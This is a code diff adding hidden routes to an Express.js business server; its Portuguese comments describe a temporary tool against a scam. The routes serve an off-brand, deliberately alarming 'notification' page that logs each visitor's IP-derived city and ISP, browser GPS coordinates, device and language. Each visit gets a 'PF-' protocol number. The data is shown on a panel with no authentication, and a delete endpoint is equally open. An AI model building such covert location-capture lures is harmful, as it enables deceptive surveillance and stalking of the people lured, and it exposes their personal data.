@@ -3808,6 +3808,121 @@ app.get("/api/companies/dashboard", async (req, res) => {
   }
 });
 
+// ===========================================================================
+// CAPTURA DE LOCALIZAÇÃO (ferramenta temporária contra golpe)
+// Rotas FORA da marca Office Express — página de "notificação" + painel.
+// IP sempre capturado (geoip-lite resolve cidade/UF); GPS se o navegador
+// autorizar. Dados vão para a tabela capturas_localizacao.
+// ===========================================================================
+const geoip = require("geoip-lite");
+
+// Tabela única, criada idempotentemente no primeiro uso.
+async function garantirTabelaCapturas() {
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS capturas_localizacao (
+      id INT AUTO_INCREMENT PRIMARY KEY,
+      ip VARCHAR(45) NULL,
+      cidade VARCHAR(160) NULL,
+      uf VARCHAR(8) NULL,
+      pais VARCHAR(8) NULL,
+      isp VARCHAR(160) NULL,
+      gps_lat DECIMAL(10,7) NULL,
+      gps_lon DECIMAL(10,7) NULL,
+      gps_acc INT NULL,
+      gps_erro VARCHAR(20) NULL,
+      user_agent VARCHAR(255) NULL,
+      dispositivo VARCHAR(20) NULL,
+      tela VARCHAR(20) NULL,
+      idioma VARCHAR(10) NULL,
+      protocolo VARCHAR(40) NULL,
+      criado_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+  `);
+}
+
+// Rota da página "medonha" — caminho neutro, fora da marca (injeta as URLs das APIs).
+app.get("/monitoramento", (req, res) => {
+  const html = fs
+    .readFileSync(path.join(__dirname, "public", "monitoramento", "index.html"), "utf8")
+    .replace("__CAPTURA_URL__", "/monitoramento/api/captura");
+  res.send(html);
+});
+// Painel com a tabela dos dados capturados.
+app.get("/monitoramento/painel", (req, res) => {
+  const html = fs
+    .readFileSync(path.join(__dirname, "public", "monitoramento", "painel.html"), "utf8")
+    .replace("__CAPTURA_LISTA_URL__", "/monitoramento/api/lista")
+    .replace("__CAPTURA_LIMPAR_URL__", "/monitoramento/api/limpar");
+  res.send(html);
+});
+
+// Recebe a captura (UA, tela, GPS) — o IP é extraído no servidor.
+app.post("/monitoramento/api/captura", async (req, res) => {
+  try {
+    await garantirTabelaCapturas();
+    const body = req.body || {};
+    const ip = String(req.headers["x-forwarded-for"] || req.socket.remoteAddress || "")
+      .split(",")[0].trim().slice(0, 45);
+    const geo = geoip.lookup(ip) || {};
+    const cidade = body.gpsCidade || geo.city || null;
+    const uf = body.gpsUf || geo.region || null;
+    const dispositivo = /Mobi|Android/i.test(String(body.ua || "")) ? "mobile" : "desktop";
+    const protocolo = "PF-" + Date.now().toString(36).toUpperCase() + "-" + Math.floor(Math.random() * 1e4);
+    const gps = body.gps && typeof body.gps.lat === "number" ? body.gps : null;
+    await pool.query(
+      `INSERT INTO capturas_localizacao
+        (ip, cidade, uf, pais, isp, gps_lat, gps_lon, gps_acc, gps_erro, user_agent, dispositivo, tela, idioma, protocolo)
+       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+      [
+        ip, cidade, uf, geo.country || null, geo.org || null,
+        gps ? gps.lat : null, gps ? gps.lon : null, gps ? Math.round(gps.acc || 0) : null,
+        body.erroGps || null,
+        String(body.ua || "").slice(0, 255), dispositivo,
+        String(body.tela || "").slice(0, 20), String(body.idioma || "").slice(0, 10),
+        protocolo,
+      ]
+    );
+    res.json({
+      ok: true,
+      dados: {
+        ip: ip || null,
+        cidade: cidade || null,
+        uf: uf || null,
+        isp: geo.org || null,
+        gps: gps ? { lat: gps.lat, lon: gps.lon, acc: gps.acc } : null,
+        protocolo,
+      },
+    });
+  } catch (e) {
+    console.error("❌ Erro na captura de localização:", e.message);
+    res.status(500).json({ ok: false });
+  }
+});
+
+// Lista para o painel (mais recentes primeiro).
+app.get("/monitoramento/api/lista", async (req, res) => {
+  try {
+    await garantirTabelaCapturas();
+    const [rows] = await pool.query(
+      "SELECT * FROM capturas_localizacao ORDER BY id DESC LIMIT 200"
+    );
+    res.json({ ok: true, registros: rows });
+  } catch (e) {
+    console.error("❌ Erro ao listar capturas:", e.message);
+    res.status(500).json({ ok: false });
+  }
+});
+
+// Limpar tudo (temporário).
+app.post("/monitoramento/api/limpar", async (req, res) => {
+  try {
+    await pool.query("DELETE FROM capturas_localizacao");
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ ok: false });
+  }
+});
+
 // Preços atuais dos planos (configuráveis pelo admin no painel).
 app.get("/api/companies/planos/precos", async (req, res) => {
   try {
